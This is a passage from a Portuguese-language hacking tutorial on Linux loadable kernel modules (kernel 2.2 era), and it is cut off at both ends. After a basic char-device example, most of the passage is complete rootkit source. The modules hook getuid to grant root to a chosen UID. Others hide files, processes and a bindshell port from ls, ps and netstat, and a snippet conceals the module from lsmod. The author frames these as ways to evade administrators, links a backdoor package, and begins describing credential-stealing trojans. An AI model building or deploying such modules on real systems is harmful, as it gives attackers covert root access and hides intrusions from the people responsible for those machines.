+linhas formam nomes genericos para o LKM requerido naquele sistema.A
+seguinte linha diz que eth0 eh representado por um driver LKM Tulip DEC:
+
+# /etc/modules.conf          # or /etc/conf.modules - isto difere
+alias eth0 tulip
+
+Este era o espaco do user-space representado pelo Daemon Kernel.A parte do
+kernel space eh essencialmente representada por 4 funcoes.Essas funcoes
+sao todas baseadas em uma chamada para kerneld_send.Kernel_send eh
+envolvido para chamar as funcoes encontradas em linux/kerneld.h.A seguinte
+tabela abaixo lista as 4 funcoes mencionadas acima:
+
++------------------------------------------------------------------------+
+|             FUNCAO               |             DESCRICAO               |
++------------------------------------------------------------------------+
+| int sprintf (char *buf, const    | Funcoes para enpacotamento de dados |
+|                char *fmt, ...);  | sobre strings.			 |
+| int vsprintf (char *buf, const   |					 |
+|       char *fmt, va_list args);  |					 |
++------------------------------------------------------------------------+
+| int request_module (const char   | Diz para o kerneld que a o kernel   |
+| 			  *name);  | requer um certo modulo(dizendo um   |
+|				   | nome ou generico nome/ID).		 |
++------------------------------------------------------------------------+
+| int release_module (const char*  | Descarrega um modulo.		 |
+|            name, int waitflag);  |					 |
++------------------------------------------------------------------------+
+| int delayed_release_module       | Atrasa o descarregamento do modulo. | 
+|             (const char *name);  |					 |
++------------------------------------------------------------------------+
+| int cancel_release_module        | Cancela uma chamada de atraso de    |
+|             (const char *name);  | descarregamento de modulo           |
+|				   | (delayed_release_module).           |
++------------------------------------------------------------------------+
+
+Nas versoes 2.2.X, muita coisa mudou, elas nao usam mais kerneld.Elas usam
+outro modo para implementar a funcao do kernel space request_module(...),
+este modo se chama kmod.kmod roda totalmente no kernel space(sem mais IPC
+para o user space).Para programadores de LKMs nada muda, voce pode ainda 
+usar o request_module(...) para carregar modulos.
+
+5.10. - Criando Seu Proprio Device
+-----------------------------------
+
+Abaixo segue um exemplo bem simples da criacao de um Device Driver do tipo
+char:
+
+-------------------------------- device.c -------------------------------
+/* Simples Exemplo de Criacao de um Device Drive.
+   Feito por pragmatic para tutorial de LKM da THC.
+   Alterado por Nash Leon para Tutorial de LKM do Unsekurity Team.
+   http://unsekurity.virtualave.net/ */
+
+#define   MODULE
+#define __KERNEL__
+
+/* Headers Necessarios, sempre tenha atencao maxima com isso! */
+
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <asm/unistd.h>
+#include <sys/syscall.h>
+#include <linux/fs.h>
+
+/* Abaixo segue funcao para demonstracao */
+
+static int abre_driver(struct inode *i, struct file *f)
+{
+ printk("<1>Unsekurity Team!!\n");
+ printk("<1>http://unsekurity.virtualave.net/\n");
+ return 0;
+}
+
+static struct file_operations fops = {
+NULL,                 /*lseek*/
+NULL,                 /*read*/
+NULL,                 /*write*/
+NULL,                 /*readdir*/
+NULL,                 /*select*/
+NULL,                 /*ioctl*/
+NULL,                 /*mmap*/
+abre_driver,          /*open, da uma olhada em nossa funcao aberta */
+NULL,                 /*release*/
+NULL                  /*fsync...*/
+};
+int init_module(void)
+{
+ /* abaixo ele registra o driver com major = 40 e o nome do driver =
+    unsek */
+ if(register_chrdev(40, "unsek", &fops)) return -EIO;
+ printk("<1>Modulo Carregado com Sucesso!!\n");
+ return 0;
+}
+
+void cleanup_module(void)
+{
+/* Desregistra o nosso driver */
+ unregister_chrdev(40, "unsek");
+printk("<1>Modulo Descarregado com Sucesso!!\n");
+}
+---------------------------------------------------------------------------
+
+Se quer saber o que este simples exemplo faz, siga os passos abaixo:
+
+# gcc -c -O3 device.c
+# mknod /dev/unsek c 40 0
+# insmod device.o
+
+Voce pode usar varios esquemas para ver o que tem no device.Exemplos:
+
+# cat /dev/unsek
+Unsekurity Team!!
+http://unsekurity.virtualave.net/
+cat: /dev/unsek: Invalid argument
+
+# strings /dev/unsek
+Unsekurity Team!!
+http://unsekurity.virtualave.net/
+
+Este eh soh um exemplo basico.Logo veremos algo mais interessante.
+
+5.11. - Alguns Macros
+----------------------
+
+Varios sao os macros usados na construcao simplificada de LKMs.Irei
+descrever apenas alguns, mas uma consulta aos fontes de sua kernel
+ajudaria bastante.
+
++ Contadores
+-------------
+
+O Sistema mantem um contador para cada modulo para determinar se o mesmo
+pode ser eliminado sem causar prejuizos ao sistema.O sistema precisa desta
+informacao, pois o modulo nao poderah ser descarregado se estiver sendo
+utilizado: nao se deve remover um tipo de sistema de arquivos enquanto ele
+eh montado e nem parar um driver de caracteres enquanto um processo o
+estiver executando(esse conceito eh usada para tornar um modulo irremovivel).
+
+O Contador eh controlado por tres macros:
+
+MOD_INC_USE_COUNT -> Adiciona ao contador um modulo atual.
+MOD_DEC_USE_COUNT -> Subtrai do Contador.
+MOD_IN_USE ->Avalia como verdadeiro se o contador for diferente de zero.
+
+Essas macros sao definidas em <linux/module.h> e funcionam nas estruturas
+internas dos dados que nao devem ser acessadas diretamente pelo programador.
+
++ Usando Recursos
+------------------
+
+Um modulo nao pode executar suas tarefas sem usar os recursos do sistema,
+como memoria, portas de E/S e linhas de interrupcao.Como programador, voce
+jah deve estar acostumado a gerenciar a alocacao de memoria e, essa tarefa
+eh bastante semelhante a escrever o codigo do kernel.Seu programa obtem
+uma area de memoria, usando 'kmalloc' e a libera usando 'kfree'.Essas
+funcoes funcionam como malloc e free, a menos que kmalloc tenha um
+argumento adicional, a prioridade.Na maioria das vezes, uma prioridade de
+GFP_KERNEL serah utilizada.A abreviacao GFP significa "Get Free Page"
+(Liberar Pagina).
+
+
+5.12. - Esquemas para Fucadores
+--------------------------------
+
+Agora vamos ao que de fato interessa.Com as ferramentas acima descritas,
+jah podemos fazer muitas coisas, e aqui irei disponibilizar alguns esquemas.
+
+5.12.1 - Interceptando systemcalls
+------------------------------------
+
+Para interceptar um system call nao tem muito segredo.Basta usarmos a
+propria tabela de system calls para nos dar uma forca, abaixo segue um
+exemplo jah demonstrado anteriormente:
+
+----------------------------- soheuroot.c --------------------------------
+
+#define     MODULE
+#define   __KERNEL__
+
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/stat.h>
+#include <linux/mm.h>
+#include <linux/if.h>
+#include <sys/syscall.h>
+#include <asm/unistd.h>
+
+#define MINHA_UID 1000
+
+extern void *sys_call_table[] ;
+
+/* Funcao que serah usada para salvar o antigo system call */
+
+int (*original_getuid)();
+
+/* Nossa funcao backdoor para sys_getuid */
+int back_get(){
+/* Compara uid atual, se for igual a que desejamos, ele irah transformar
+   os configuracoes que desejamos */
+
+if (current->uid == MINHA_UID) {
+current->uid = 0;
+current->gid = 0;
+current->euid = 0;}
+        return 0;
+}
+
+int init_module(void){
+printk("<1>BACKDOOR VIA LKM by Nash Leon!!\n");
+printk("<0>\n");
+printk("<1>Instalando Backdoor...\n");
+original_getuid = sys_call_table[__NR_getuid];
+sys_call_table[__NR_getuid] = back_get;
+printk("<1>****.* Unsekurity Team *.****\n");
+printk("<1>Backdoor Instalada com Sucesso!!!\n");
+return 0;
+}
+
+int cleanup_module(void){
+sys_call_table[__NR_getuid] = original_getuid;
+printk("<1>Modulo Descarregado!\n");
+return 0;
+}
+----------------------------------------------------------------------
+
+Compile ele normalmente e teste num usuario e verah que funciona 
+perfeitamente.O escopo abaixo nos dah o esquema para se interceptar um
+system call:
+
+-------------- ESCOPO PARA SE INTERCEPTAR UM SYSTEM CALL ---------------
+
+#define     MODULE
+#define   __KERNEL__
+
+(HEADERS NECESSARIOS)
+
+extern void *sys_call_table[] ;
+
+(FUNCAO QUE SERAH USADA PARA SALVAR O ANTIGO SYSTEM CALL - FSALVA);
+
+(FUNCAO COM CODIGOS QUE SERAO EXECUTADOS APOS A INTERCEPTACAO - FHACKER);
+
+int init_module(void)                
+{
+ FSALVA = sys_call_table[__NR_SYSTEMCALL];
+ sys_call_table[SYS_SYSTEMCALL]= FHACKER;
+ return 0;
+}
+
+void cleanup_module(void)            
+{
+ sys_call_table[SYS_SYSTEMCALL]= FSALVA; /* Retorna de volta o system
+					    call original.
+}
+------------------------------------------------------------------------
+
+Existem diversos outros system calls interessantes para interceptar, no
+decorrer deste tutorial voce verah alguns, entre fundo na programacao de
+LKM, voce verah muitas coisas interessantes.
+
+5.12.2. - Escondendo um arquivo
+--------------------------------
+
+Isto eh mesmo interessante!!:). Acho que os passos que damos nos levam
+a uma 'estranheza', quanto mais aprendemos mais divertido as coisas vao
+ficando, acho que o hacking tem isso, as tecnicas dao prazer!!:)
+
+Como vimos na parte sobre system calls, o system call responsavel por
+nos das informacoes sobre um arquivo se chama __NR_getdents (veja tabela
+no item 3.4). Usando o esboco acima, estamos capacitados a construir um
+LKM capaz de esconder um arquivo da percepcao dos comandos que usam este
+system call.
+
+--------------------------- escondels.c --------------------------------
+
+/* LKM PARA ESCONDER UM ARQUIVO.
+   Desenvolvido por pragmatic para Tutorial de LKM da THC.
+   Alterado por Nash Leon para Tutorial de LKM do Unsekurity Team.
+   LKM para Kernel 2.2.X(Testado em 2.2.13).
+*/
+
+#define   MODULE
+#define __KERNEL__
+
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <asm/unistd.h>
+#include <sys/syscall.h>
+#include <asm/uaccess.h>
+#include <linux/malloc.h>
+#include <linux/dirent.h>
+
+/* Defina o arquivo abaixo para que esconde algum arquivo seu */
+
+#define  ARQUIVO "senhas.txt"
+
+
+extern void* sys_call_table[];
+int (*original_getdents) (uint, struct dirent *, uint);
+
+int hacked_getdents(unsigned int fd, struct dirent *dirp, unsigned int
+count)
+{
+ unsigned int tmp, n;
+ int t, proc = 0;
+ struct inode *dinode;
+ struct dirent *dirp2, *dirp3;
+ char oculta[]= ARQUIVO;
+
+/* Abaixo, chama-se o original getdents, o resultado eh salvo em tmp */
+tmp = (*original_getdents) (fd, dirp, count);
+
+/* Abaixo segue o manejo do cache do diretorio */
+/* Isto precisa ser checado pois pode ser possivel que um antigo getdents
+   empurre o resultado sobre a estruta do processo atarefado dcache */
+
+#ifdef __LINUX_DCACHE_H
+    dinode = current->files->fd[fd]->f_dentry->d_inode;
+#else
+    dinode = current->files->fd[fd]->f_inode;
+#endif
+
+/* dinode eh o inode do diretorio requerido */
+
+if (tmp > 0)
+ {
+  /* dirp2 eh uma nova estrutura dirent */
+
+  dirp2 = (struct dirent *) kmalloc(tmp, GFP_KERNEL);
+
+  /* copia a estrutura dirent original sobre dirp2 */
+  copy_from_user(dirp2, dirp, tmp);
+
+ /* dirp3 aponta para dirp2 */
+
+  dirp3 = dirp2;
+  t = tmp;
+  while (t > 0)
+  {
+   n = dirp3->d_reclen;
+   t -= n;
+/* checa se arquivo atual eh o nome do arquivo que nos queremos ocultar */
+
+   if (strstr((char *) &(dirp3->d_name), (char *) &oculta) != NULL)
+   {
+
+/* modifica a estrutura dirente se necessario */
+    if (t != 0)
+     memmove(dirp3, (char *) dirp3 + dirp3->d_reclen, t);
+    else
+     dirp3->d_off = 1024;
+    tmp -= n;
+   }
+  if (t != 0)
+   dirp3 = (struct dirent *) ((char *) dirp3 + dirp3->d_reclen);
+  }
+  copy_to_user(dirp, dirp2, tmp);
+  kfree(dirp2);
+ }
+ return tmp;
+}
+
+int init_module(void)
+{
+ original_getdents=sys_call_table[__NR_getdents];
+ sys_call_table[__NR_getdents]=hacked_getdents;
+ printk("<1>Modulo Carregado com Sucesso!!\n");
+ return 0;
+}
+
+void cleanup_module(void)
+{
+ sys_call_table[__NR_getdents]=original_getdents;
+ printk("<1>Modulo Descarregado com Sucesso!!\n");
+}
+------------------------------------------------------------------------
+
+Compile e carregue o LKM, poderah ver perfeitamente que ele esconde um
+arquivo da execucao de um ls, por exemplo, mas se alguem der algo tipo:
+'ls senhas.txt' ou 'cat senhas.txt', nosso arquivo aparecerah.Voce
+poderia mudar o nome para algo bem esquisito, ficaria dificil do admin
+detectar, mas existe um esquema melhor.Como melhorar isto??
+
+O melhor modo que eu conheco eh esconder um diretorio e esconder do system
+call __NR_open tambem.Vejamos como esconder algo somente do system call
+__NR_open:
+
+--------------------------- esconde_open.c ------------------------------
+
+#define MODULE
+#define __KERNEL__
+
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <asm/unistd.h>
+#include <sys/syscall.h>
+#include <asm/uaccess.h>
+#include <linux/malloc.h>
+
+#define  ARQUIVO  "alvo"
+
+extern void* sys_call_table[];
+
+int (*original_open)(const char *pathname, int flag, mode_t mode);
+
+int hacked_open(const char *pathname, int flag, mode_t mode)
+{
+ char *kernel_pathname;
+ char oculta[]=ARQUIVO;
+
+ /* Tranfere para Espaco kernel - kernel Space */
+
+ kernel_pathname = (char*) kmalloc(256, GFP_KERNEL);
+
+ copy_from_user(kernel_pathname, pathname, 255);
+
+ if (strstr(kernel_pathname, (char*)&oculta ) != NULL)
+ {
+  kfree(kernel_pathname);
+
+ /* Retorna codigo de erro para 'file does not exist' */
+
+  return -ENOENT;
+ }
+ else
+ {
+  kfree(kernel_pathname);
+  return original_open(pathname, flag, mode);
+ }
+}
+
+
+int init_module(void)
+{
+ original_open=sys_call_table[__NR_open];
+ sys_call_table[__NR_open]=hacked_open;
+ printk("<1>Modulo Carregado com Sucesso!!\n");
+ return 0;
+}
+
+void cleanup_module(void)
+{
+ sys_call_table[__NR_open]=original_open;
+ printk("<1>Modulo descarregado com Sucesso!!\n");
+}
+-------------------------------------------------------------------------
+
+Compilando e carregando este LKM em conjunto com o outro, um usuario
+ficarah impossibilitado de abrir o o arquivo que voce deseja, com os dois
+em conjunto,voce pode ocultar um diretorio.Teste-os em um diretorio, 
+depois digite 'ls diretorio'.Se existir um arquivo dentro do diretorio
+escondido, ele poderah ser listado com 'ls diretorio/arquivo', no
+entanto ele nao poderah ser aberto.Voce poderia criar outro LKM para
+esconder este diretamente este arquivo de getdents e esconder o diretorio
+onde ele se encontra, ou mesmo melhorar o LKM anterior para esconder mais
+de um arquivo.No meu Slackware 2.2.13 eu nao consegui unir ambos num LKM
+soh(enganar __NR_open e __NR_getdents de uma soh vez), muitos problemas
+com os headers, mas separadamente deu blz.
+
+Vimos entao que eh possivel esconder um arquivo ou diretorio, vamos entao
+ver como se esconde um processo.
+
+5.12.3. - Escondendo um Processo
+----------------------------------
+
+Esconder um processo requer um pouco mais de bits de conhecimento em
+Linux, C e LKM.O melhor modo que eu acho eh criar um programa que
+interaja com o LKM, atraves do envio de sinais previamente definidos,o 
+LKM saberah o que estamos querendo e executarah as instrucoes necessarias.
+Abaixo segue o codigo do LKM responsavel pela ocultacao de desocultacao
+de um PID:
+
+----------------------------- esconde_ps.c ------------------------------
+/* LKM para esconder um processo pai e seus filhos.
+   Desenvolvido por Nash Leon vulgo coracaodeleao.
+   nashleon@yahoo.com.br
+   Feito para kernel 2.2.13 (Slackware 7.0)
+   Baseado no tutorial de LKM da THC.
+   http://www.infowar.co.uk/thc/
+*/
+
+#define   MODULE
+#define __KERNEL__
+
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <asm/unistd.h>
+#include <asm/uaccess.h>
+#include <linux/proc_fs.h>
+#include <linux/types.h>
+#include <linux/dirent.h>
+#include <linux/malloc.h>
+#include <linux/stat.h>
+#include <linux/if.h>
+#include <linux/unistd.h>
+
+/* Abaixo segue PF_INVISIBLE para esconder um PID, OCULTA e DESOCULTA
+   eh o nosso 'mando' para o LKM.Defina o numero que desejar, de
+   preferencia alto. */
+
+#define PF_INVISIBLE 0x10000000
+#define OCULTA       29
+#define DESOCULTA    30
+
+extern void* sys_call_table[];
+static int errno;
+
+/* P/ pegar os systemcalls normais */
+static int (*original_kill)(pid_t, int);
+int (*original_getdents) (uint, struct dirent *, uint);
+static pid_t (*original_fork)(struct pt_regs);
+
+static int hacked_getdents(unsigned int, struct dirent *, unsigned int);
+static int meu_atoi(char *);
+static int escondendo(pid_t);
+
+
+static int hacked_getdents(unsigned int fd, struct dirent *dirp, unsigned
+int count)
+{
+unsigned int tmp, n;
+int proc = 0, t;
+struct inode *dinode;
+struct dirent *dirp_kern, *p_dk;
+if(!(tmp = (*original_getdents) (fd, dirp, count)))
+return -errno;
+
+/* Macros de checagem de cache */
+
+#ifdef __LINUX_DCACHE_H
+        dinode = current->files->fd[fd]->f_dentry->d_inode;
+#else
+        dinode = current->files->fd[fd]->f_inode;
+#endif
+
+if(dinode->i_ino == PROC_ROOT_INO && !MAJOR(dinode->i_dev) &&
+MINOR(dinode->i_dev) == 1)
+proc = 1;
+
+dirp_kern = (struct dirent *) kmalloc(tmp, GFP_KERNEL);
+
+copy_from_user(dirp_kern, dirp, tmp);
+p_dk = dirp_kern;
+t = tmp;
+while (t > 0)
+{
+n = p_dk->d_reclen;
+t -= n;
+
+if(proc && escondendo(meu_atoi(p_dk->d_name)))
+{
+if (t != 0)
+memmove(p_dk, (char *) p_dk + p_dk->d_reclen, t);
+else
+p_dk->d_off = 1024;
+
+tmp -= n;
+}
+
+if (p_dk->d_reclen == 0)
+{
+tmp -= t;
+t = 0;
+}
+
+if (t != 0)
+p_dk = (struct dirent *) ((char *) p_dk + p_dk->d_reclen);
+}
+
+copy_to_user(dirp, dirp_kern, tmp);
+kfree(dirp_kern);
+return tmp;
+}
+
+
+static pid_t hacked_fork(struct pt_regs regs)
+{
+pid_t pid;
+int hideit;
+struct task_struct *t = current;
+
+hideit = escondendo(current->pid);
+pid = (*original_fork)(regs);
+
+do
+{
+if(t->pid == pid)
+        break;
+
+t = t->next_task;
+} while(t != current);
+
+if(t->pid == pid && hideit)
+t->flags |= PF_INVISIBLE;
+
+return pid;
+}
+static int hacked_kill(pid_t pid, int sinal)
+{
+int ret;
+struct task_struct *t = current;
+
+/* Abaixo faz comparacao do signal desejado */
+
+if(sinal != OCULTA && sinal != DESOCULTA){
+if((ret = (*original_kill)(pid, sinal)) == -1)
+return -errno;
+return ret;
+}
+do
+{
+if(t->pid == pid)
+break;
+
+t = t->next_task;
+}
+while(t != current);
+
+if(t->pid != pid)
+                return -ESRCH;
+
+switch(sinal)
+{
+case OCULTA:
+t->flags |= PF_INVISIBLE;
+break;
+
+case DESOCULTA:
+t->flags &= ~PF_INVISIBLE;
+break;
+default:
+break;
+}
+
+        return 0;
+}
+
+/* Converte string em numeros */
+
+static int meu_atoi(char *string)
+{
+char *p;
+int ret = 0;
+int m = ret + 1;
+
+for(p = &string[strlen(string) - 1];p >= string;p--)
+{
+if(*p < '0' || *p > '9')
+return 0;
+
+ret += (*p - '0') * m;
+m *= 10;
+}
+
+return ret;
+}
+
+
+static int escondendo(pid_t pid)
+{
+struct task_struct *t = current;
+
+do
+{
+if(t->pid == pid)
+        break;
+t = t->next_task;
+}
+while(t != current);
+
+if(t->pid != pid)
+return 0;
+
+return (t->flags & PF_INVISIBLE);
+}
+
+int init_module(void)
+{
+original_getdents = sys_call_table[__NR_getdents];
+original_fork = sys_call_table[__NR_fork];
+original_kill = sys_call_table[__NR_kill];
+
+sys_call_table[__NR_getdents] = hacked_getdents;
+sys_call_table[__NR_fork]  = hacked_fork;
+sys_call_table[__NR_kill]  = hacked_kill;
+
+printk("<1>Modulo Carregado com Sucesso!!\n");
+return 0;
+}
+
+void cleanup_module(void)
+{
+sys_call_table[__NR_getdents] = original_getdents;
+sys_call_table[__NR_fork] = original_fork;
+sys_call_table[__NR_kill] = original_kill;
+printk("<1>Modulo Descarregado com Sucesso!!\n");
+}
+---------------------------------------------------------------------------
+
+Este eh o LKM.Um pouco complicado, sem duvida, recomendo a voce procurar
+nos headers as declaracoes das estruturas envolvidas em cada processo.
+Lah voce pode contemplar mais ou menos como eh feito o esquema e como
+se passam os argumentos atuais.Mas este programa necessita de um simples
+.c que serah usado no user space para interagir com este LKM e esconder
+o processo que desejarmos.Abaixo segue um exemplo de um programa para
+isso:
+
+---------------------------- inter_esconde.c ----------------------------
+
+/* PROGRAMA EXECUTOR USADO EM CONJUNTO COM LKM PARA
+   ESCONDER PROCESSOS EM EXECUCAO VIA PID.
+   DESENVOLVIDO POR NASH LEON VULGO CORACAODELEAO.
+   nashleon@yahoo.com.br
+   THAKS UNSEKURITY TEAM.
+   http://unsekurity.virtualave.net/
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <signal.h>
+#include <sys/types.h>
+
+#define OCULTA    29
+#define DESOCULTA 30
+
+void uso(char *nome);
+void uso(char *nome){
+system("clear");
+printf("\nUso: %s PID <on|off>\n\n",nome);
+printf("Onde:\n");
+printf("PID -> Eh o numero do processo que voce quer esconder.\n");
+printf("on  -> Esconde o processo.\n");
+printf("off -> Torna o processo escondido ao seu estado normal.\n\n");
+exit(0);
+}
+
+int main(int argc, char *argv[]){
+if(argc < 3){
+uso(argv[0]);
+}
+if(!strcmp(argv[2],"on")){
+kill(atoi(argv[1]), OCULTA);
+return 0;
+}
+if(!strcmp(argv[2],"off")){
+kill(atoi(argv[1]), DESOCULTA);
+return 0;
+}
+fprintf(stderr,"Erro: Check a Sintaxe e o PID corretamente.\n");
+return 0;
+}
+------------------------------------------------------------------------
+
+Nao tem muito segredo.A interacao ocorre atraves de um kill() seguido dos
+argumentos pre-definidos.
+
+Compile o lkm normalmente, em seguida o .c e escolha um processo qualquer
+via 'ps aux' por exemplo.Carregue o lkm em seguida use o .c usando como
+argumento o PID do processo que voce quer ocultar seguido de 'on' para
+esconder, e depois use 'off' para desocultar.Consegue contemplar 
+esquemas para isso??? Voce pode pensar em esconder uma backdoor, creio
+que este esquema eh muito eficiente, mas pode ser melhorado, use sua
+imaginacao!
+
+5.12.4 - Fugindo de netstat
+----------------------------
+
+Muitos administradores de redes confiam demasiadamente no comando 'netstat'
+para denunciar uma backdoor do tipo bindshell.No item anterior vimos como
+esconder um processo de comandos como ps, pstree, top e etc, agora iremos
+mais alem e veremos um exemplo de um LKM alem de esconder um PID, ele
+esconde uma porta aberta da visao de netstat.
+
+-------------------------- esconde_netstat.c ----------------------------
+
+/* LKM para esconder um processo pai e seus filhos.
+   Esconde de 'netstat' tambem.
+   Desenvolvido por Nash Leon vulgo coracaodeleao.
+   nashleon@yahoo.com.br
+   Feito para kernel 2.2.13 (Slackware 7.0)
+   Este modulo foi baseado no tutorial de LKM by THC.
+   http://www.infowar.co.uk/thc/
+*/
+
+#define   MODULE
+#define __KERNEL__
+
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <asm/unistd.h>
+#include <asm/uaccess.h>
+#include <linux/proc_fs.h>
+#include <linux/types.h>
+#include <linux/dirent.h>
+#include <linux/malloc.h>
+#include <linux/if.h>
+#include <linux/unistd.h>
+
+/* Defina abaixo os seus argumentos a a porta a ser ocultada */
+
+#define PF_INVISIBLE 0x10000000
+#define OCULTA       29
+#define DESOCULTA    30
+#define PROCESSO     ":20000"
+
+extern void* sys_call_table[];
+static int errno;
+
+/* P/ pegar os systemcalls normais */
+
+static int (*original_kill)(pid_t, int);
+int (*original_getdents) (uint, struct dirent *, uint);
+static pid_t (*original_fork)(struct pt_regs);
+int (*original_write)(unsigned int, char *, size_t);
+
+static int hacked_write(unsigned int fd, char *buffer, size_t count);
+static int hacked_getdents(unsigned int, struct dirent *, unsigned int);
+static int meu_atoi(char *);
+static int escondendo(pid_t);
+
+static int hacked_getdents(unsigned int fd, struct dirent *dirp, unsigned
+int count)
+{
+unsigned int tmp, n;
+int proc = 0, t;
+struct inode *dinode;
+struct dirent *dirp_kern, *p_dk;
+
+if(!(tmp = (*original_getdents) (fd, dirp, count)))
+return -errno;
+
+#ifdef __LINUX_DCACHE_H
+        dinode = current->files->fd[fd]->f_dentry->d_inode;
+#else
+        dinode = current->files->fd[fd]->f_inode;
+#endif
+
+if(dinode->i_ino == PROC_ROOT_INO && !MAJOR(dinode->i_dev) &&
+MINOR(dinode->i_dev) == 1)
+proc = 1;
+
+dirp_kern = (struct dirent *) kmalloc(tmp, GFP_KERNEL);
+copy_from_user(dirp_kern, dirp, tmp);
+p_dk = dirp_kern;
+t = tmp;
+while (t > 0)
+{
+n = p_dk->d_reclen;
+t -= n;
+
+if(proc && escondendo(meu_atoi(p_dk->d_name)))
+{
+if (t != 0)
+memmove(p_dk, (char *) p_dk + p_dk->d_reclen, t);
+else
+p_dk->d_off = 1024;
+
+tmp -= n;
+}
+
+if (p_dk->d_reclen == 0)
+{
+tmp -= t;
+t = 0;
+}
+
+if (t != 0)
+p_dk = (struct dirent *) ((char *) p_dk + p_dk->d_reclen);
+}
+
+copy_to_user(dirp, dirp_kern, tmp);
+kfree(dirp_kern);
+return tmp;
+}
+
+static pid_t hacked_fork(struct pt_regs regs)
+{
+pid_t pid;
+int hideit;
+struct task_struct *t = current;
+
+hideit = escondendo(current->pid);
+pid = (*original_fork)(regs);
+
+do
+{
+if(t->pid == pid)
+        break;
+
+t = t->next_task;
+} while(t != current);
+
+if(t->pid == pid && hideit)
+t->flags |= PF_INVISIBLE;
+
+return pid;
+}
+
+static int hacked_kill(pid_t pid, int sinal)
+{
+int ret;
+struct task_struct *t = current;
+
+/* Abaixo faz comparacao do signal desejado */
+
+if(sinal != OCULTA && sinal != DESOCULTA){
+if((ret = (*original_kill)(pid, sinal)) == -1)
+return -errno;
+return ret;
+}
+do
+{
+if(t->pid == pid)
+break;
+t = t->next_task;
+}
+while(t != current);
+
+if(t->pid != pid)
+                return -ESRCH;
+
+switch(sinal)
+{
+case OCULTA:
+t->flags |= PF_INVISIBLE;
+break;
+
+case DESOCULTA:
+t->flags &= ~PF_INVISIBLE;
+break;
+
+default:
+break;
+}
+
+        return 0;
+}
+
+
+static int meu_atoi(char *string)
+{
+char *p;
+int ret = 0;
+int m = ret + 1;
+
+for(p = &string[strlen(string) - 1];p >= string;p--)
+{
+if(*p < '0' || *p > '9')
+return 0;
+ret += (*p - '0') * m;
+m *= 10;
+}
+
+return ret;
+}
+
+
+static int escondendo(pid_t pid)
+{
+struct task_struct *t = current;
+
+do
+{
+if(t->pid == pid)
+        break;
+
+t = t->next_task;
+}
+while(t != current);
+
+if(t->pid != pid)
+return 0;
+
+return (t->flags & PF_INVISIBLE);
+}
+
+int hacked_write(unsigned int fd, char *buffer, size_t count){
+char tmp[1000];
+if (strcmp(current->comm, "netstat") == 0 ) {
+memset(tmp, 0, sizeof(tmp));
+copy_from_user(tmp, buffer, sizeof(tmp)-1);
+if(strstr(tmp,PROCESSO)) {
+return count;
+                           }
+           }
+return original_write(fd, buffer, count);
+}
+
+int init_module(void)
+{
+
+original_getdents = sys_call_table[__NR_getdents];
+original_fork = sys_call_table[__NR_fork];
+original_kill = sys_call_table[__NR_kill];
+original_write = sys_call_table[__NR_write];
+
+sys_call_table[__NR_getdents] = hacked_getdents;
+sys_call_table[__NR_fork]  = hacked_fork;
+sys_call_table[__NR_kill]  = hacked_kill;
+sys_call_table[__NR_write] = hacked_write;
+printk("<1>Modulo Carregado com Sucesso!!\n");
+return 0;
+}
+
+void cleanup_module(void)
+{
+sys_call_table[__NR_getdents] = original_getdents;
+sys_call_table[__NR_fork] = original_fork;
+sys_call_table[__NR_kill] = original_kill;
+sys_call_table[__NR_write] = original_write;
+printk("<1>Modulo Descarregado com Sucesso!!\n");
+}
+------------------------------------------------------------------------
+
+Compile ele normalmente e teste com o .c do exemplo anterior, carregue
+uma backdoor do tipo bindshell na porta definida acima em 'PROCESSO' e
+verah que este LKM funciona perfeitamente.Se o administrador do sistema
+linux for inexperiente, ele dificilmente detectarah esta backdoor.Isso
+demonstra a eficiencia dos esquemas que envolvem LKM.Mas se o
+administrador da rede usar lsmod, ele verah o seu LKM e irah tentar
+remove-lo.Como fugir disso?
+
+5.12.5 - Fugindo de lsmod e rmmod
+----------------------------------
+
+O pragmatic teorizou um esquema interessante para se esconder um LKM e
+torna-lo irremovivel, no entanto, o melhor esquema que eu vih foi o do
+Stealph em conjunto com o pessoal da teso.O adore implementa um esquema
+interessante e bastante simples para se esconder um LKM.Usando o LKM
+anterior, tudo que voce precisa fazer eh inserir o seguinte codigo no
+inicio da funcao 'init_module()':
+
+/* Abaixo segue esquema para esconder LKM */
+struct module *modulo = &__this_module, *apagar = NULL;
+EXPORT_NO_SYMBOLS; /* Macro para nao exporta simbolo kernel */
+apagar = modulo->next;
+/* Fazer tudo == NULL */
+if (apagar) {
+int i;
+modulo->name = apagar->name;
+modulo->size = apagar->size;
+modulo->flags = apagar->flags;
+
+for (i = 0; i < GET_USE_COUNT(apagar)+1; i++)
+MOD_INC_USE_COUNT;
+modulo->next = apagar->next;
+}
+
+Se lembra do que aparece quando damos lsmod(Module,Size,Used By), o que
+o codigo faz acima eh tornar tudo nulo.Insira ele nos exemplos anteriores
+que fizemos e depois carregue-o.Verah que funciona perfeitamente.Voce 
+pode criar um programa no user-space para interagir com ele para que ele
+possa afinal ser removido quando voce desejar, outro modo de remove-lo eh
+reiniciando o sistema.A uniao das 4 tecnicas jah vistas(esconder de ls,
+de ps, de netstat, de lsmod) pode representar uma boa Backdoor.Eu criei
+algo nesse sentido e voce pode baixa-la em:
+
+http://coracaodeleao.virtualave.net/private/sombria.1.0.tar.gz
+
+Eh uma versao inicial, mas bastante eficaz, nela segue um README e um
+Instala.sh onde voce pode obter mais informacoes sobre a mesma.Lembrando
+que ela soh somente para propositos educacionais, nao me responsabilizo
+pelo mau uso da mesma.
+
+
+5.12.6 - Redirecionando um Executavel
+--------------------------------------
+
+Ao meu ver, este eh um esquema interessante e vem dando muito trabalho
+aos administradores de rede.Digamos que exista um arquivo em /tmp/exec
+responsavel pela autenticacao de um servico, poderiamos criar um arquivo
+que faz a mesma coisa que ele e ainda captura os logins e senhas para nos,
+de nome /tmp/trojan por exemplo.
+No entanto, existem programas que detectam uma mudanca num arquivo, logo
+se simplesmente fizessemos 'cp /tmp/trojan /tmp/exec' esses programas
+detectariam e avisariam o administrador do sistema.LKM nos dah uma boa
+forma de passarmos por isso, simplesmente, redirecionando a execucao, ou
+seja, quando alguem executar /tmp/exec nos iremos breckar a execucao deste
